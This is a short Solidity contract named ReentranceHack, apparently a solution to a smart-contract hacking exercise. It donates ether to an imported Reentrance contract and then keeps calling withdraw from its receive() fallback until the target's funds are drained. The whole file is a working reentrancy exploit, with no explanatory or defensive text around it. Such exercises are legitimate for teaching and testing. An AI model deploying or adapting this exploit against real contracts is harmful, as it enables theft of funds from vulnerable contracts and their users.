pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceHack {

  function attack(address payable contractAddress) external payable {
    Reentrance reent = Reentrance(contractAddress);
    reent.donate{value: msg.value}(address(this));

    reent.withdraw(msg.value);
  }

  receive() external payable {
    Reentrance reent = Reentrance(msg.sender);
    uint balance = reent.balanceOf(address(this));
    if (balance <= msg.sender.balance) {
        reent.withdraw(balance);
    } else if (msg.sender.balance > 0) {
        reent.withdraw(msg.sender.balance);
    }
  }
}